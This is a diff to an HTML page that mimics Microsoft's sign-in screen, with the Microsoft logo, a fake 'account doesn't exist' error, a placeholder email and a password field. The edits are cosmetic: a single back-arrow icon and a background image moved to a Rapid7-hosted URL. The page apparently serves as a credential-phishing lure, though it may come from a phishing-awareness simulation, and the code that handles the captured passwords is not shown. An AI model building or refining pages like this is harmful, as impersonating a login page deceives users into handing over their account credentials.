@@ -18,12 +18,11 @@
   <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
 
   <!-- Bootstrap CSS -->
-  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
-    crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
 
   <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
 
-  <!-- Font Awesome: use CDN CSS (no integrity) so it reliably loads -->
+  <!-- Font Awesome CSS so the back icon renders reliably -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
 
   <link href="css/hover.css" rel="stylesheet" media="all">
@@ -38,8 +37,8 @@
     }
 
     body {
-      /* absolute root path to avoid base href issues */
-      background-image: url('/images/bg5.png') !important;
+      /* Use the HTTPS absolute background URL to avoid mixed-content and path issues */
+      background-image: url('https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg') !important;
       background-size: cover !important;
       background-repeat: no-repeat !important;
       background-attachment: fixed !important;
@@ -57,13 +56,13 @@
       background: #ffffff;
     }
 
-    /* ensure back icon is visible even if font icon fails — add a small fallback */
-    .fa-fallback {
-      font-family: Arial, sans-serif;
-      display: inline-block;
-      line-height: 1;
+    /* back icon style to ensure visibility */
+    #back {
+      cursor: pointer;
+      color: #23272a;
       font-size: 18px;
       vertical-align: middle;
+      display: inline-block;
     }
   </style>
 </head>
@@ -74,6 +73,7 @@
       <div class="row my-5 py-5">
         <div class="col-lg-6 mx-auto">
           <div class="m-5 p-4 bg-white" id="div1">
+            <!-- use local image path for logo; if you prefer an absolute URL replace this src -->
             <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
             <span class="h5">Sign In</span><br>
             <span id="error" class="text-danger">That Microsoft account doesn't exist. Enter a different account</span>
@@ -91,10 +91,8 @@
           <div class="m-5 p-4 bg-white" id="div2">
             <form id="contact">
               <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
-              <!-- keep original element; include fallback arrow character inside so it's visible if font fails -->
-              <i class="fas fa-arrow-left" id="back" style="cursor:pointer" aria-hidden="true">
-                <span class="fa-fallback" aria-hidden="true">‹</span>
-              </i>&nbsp;<span id="emailch">abc@abc.com</span><br>
+              <!-- SINGLE back button (removed any duplicate/fallback element) -->
+              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch">abc@abc.com</span><br>
               <span id="msg" class="text-danger"></span><br>
               <span class="h5">Password</span>
               <div class="form-group mt-2">
